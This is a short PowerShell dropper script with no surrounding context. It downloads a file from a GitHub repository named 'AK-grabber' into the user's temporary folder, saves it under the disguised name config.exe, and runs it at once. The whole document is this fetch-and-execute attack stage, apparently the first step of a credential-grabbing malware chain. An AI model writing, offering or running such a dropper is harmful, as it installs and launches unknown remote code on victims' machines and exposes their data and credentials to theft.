$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/main.ps1"
$tempPath = "$env:TEMP\config.exe"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath
